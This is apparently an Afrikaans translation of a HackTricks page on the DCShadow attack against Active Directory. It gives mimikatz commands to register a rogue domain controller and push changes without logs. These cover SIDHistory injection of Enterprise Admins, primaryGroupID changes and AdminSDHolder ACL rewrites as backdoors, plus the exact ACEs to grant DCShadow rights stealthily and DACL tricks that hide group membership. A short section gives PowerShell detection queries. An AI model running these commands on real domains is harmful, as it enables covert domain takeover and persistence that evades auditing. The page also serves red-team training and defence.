# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **attribute** (SIDHistory, SPNs...) op gespesifiseerde objekte te **push**, **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **benodig DA**-voorregte en moet binne die **root domain** wees.\
Let daarop dat, indien jy verkeerde data gebruik, taamlik lelike logs sal verskyn.<sup>[[2]](#references)</sup>

Om die aanval uit te voer, benodig jy 2 mimikatz-instanties. Een daarvan sal die RPC-bedieners met SYSTEM-voorregte begin (jy moet hier die wysigings aandui wat jy wil uitvoer), en die ander instansie sal gebruik word om die waardes te push:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Let daarop dat **`elevate::token`** nie in `mimikatz1`-sessie sal werk nie, aangesien dit die voorregte van die thread verhoog het, maar ons moet die **voorreg van die proses** verhoog.\
Jy kan ook ’n "LDAP"-objek kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge vanaf ’n DA of vanaf ’n gebruiker met hierdie minimale toestemmings uitvoer:

- In die **domeinobjek**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Die **Sites-objek** (en sy kinders) in die **Configuration-container**:
- _CreateChild and DeleteChild_
- Die objek van die **rekenaar wat as ’n DC geregistreer is**:
- _WriteProperty_ (Not Write)
- Die **teikenobjek**:
- _WriteProperty_ (Not Write)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan ’n onbevoorregte gebruiker te gee (let daarop dat dit sommige logs sal laat). Dit is baie meer beperkend as om DA-voorregte te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die gebruikersnaam _**student1**_ wanneer dit op die masjien _**mcorp-student1**_ aangemeld is, DCShadow-toestemmings oor die objek _**root1user**_ het.

## Using DCShadow to create backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Misbruik van primêre groep, enumerasiegapings en opsporing

- `primaryGroupID` is ’n afsonderlike attribuut van die groep se `member`-lys. DCShadow/DSInternals kan dit direk skryf (byvoorbeeld `primaryGroupID=512` vir **Domain Admins**) sonder afdwinging deur on-box LSASS, maar AD **skuif** steeds die gebruiker: die verandering van PGID verwyder altyd lidmaatskap uit die vorige primêre groep (dieselfde gedrag vir enige teikengroep), dus kan jy nie die ou primêre-groeplidmaatskap behou nie.<sup>[[1]](#references)</sup>
- Versteknutsmiddels verhoed dat ’n gebruiker uit sy huidige primêre groep verwyder word (`ADUC`, `Remove-ADGroupMember`), dus vereis die verandering van PGID gewoonlik direkte directory-skrywings (DCShadow/`Set-ADDBPrimaryGroup`).
- Lidmaatskapverslaggewing is inkonsekwent:
- **Sluit lede in wat deur primêre groepe afgelei word:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Laat lede uit wat deur primêre groepe afgelei word:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit wat `member` inspekteer, `Get-ADUser <user> -Properties memberOf`.
- Rekursiewe kontroles kan lede van primêre groepe mis as die **primêre groep self genestel** is (byvoorbeeld wanneer ’n gebruiker se PGID na ’n geneste groep binne Domain Admins wys); `Get-ADGroupMember -Recursive` of LDAP-rekursiewe filters sal daardie gebruiker nie teruggee nie, tensy rekursie primêre groepe uitdruklik oplos.
- DACL-truuks: aanvallers kan **ReadProperty weier** op `primaryGroupID` by die gebruiker (of op die groep se `member`-attribuut vir groepe wat nie deur AdminSDHolder beskerm word nie), wat effektiewe lidmaatskap vir die meeste PowerShell-navrae verberg; `net group` sal steeds die lidmaatskap oplos. Groepe wat deur AdminSDHolder beskerm word, sal sulke weierings terugstel.

Voorbeelde van opsporing/monitering:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Kruiskontroleer geprivilegeerde groepe deur die uitvoer van `Get-ADGroupMember` met `Get-ADGroup -Properties member` of ADSI Edit te vergelyk om teenstrydighede op te spoor wat deur `primaryGroupID` of versteekte attribute veroorsaak word.<sup>[[1]](#references)</sup>

## Shadowception - Gee DCShadow-permissies met DCShadow (geen logs van gewysigde permissies nie)

Ons moet die volgende ACEs met ons gebruiker se SID aan die einde byvoeg:<sup>[[2]](#references)</sup>

- Op die domeinobjek:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Op die aanvaller se rekenaarobjek: `(A;;WP;;;UserSID)`
- Op die teikengebruiker-objek: `(A;;WP;;;UserSID)`
- Op die Sites-objek in die Configuration-container: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van ’n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. Gebruik dus in die **mimikatz1-sessie** (RPC-bediener) die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier hoef jy slegs **`/push`** een keer te gebruik om al die opgehoopte veranderinge in die rogue server uit te voer.

[**Meer inligting oor DCShadow op ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Verwysings

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
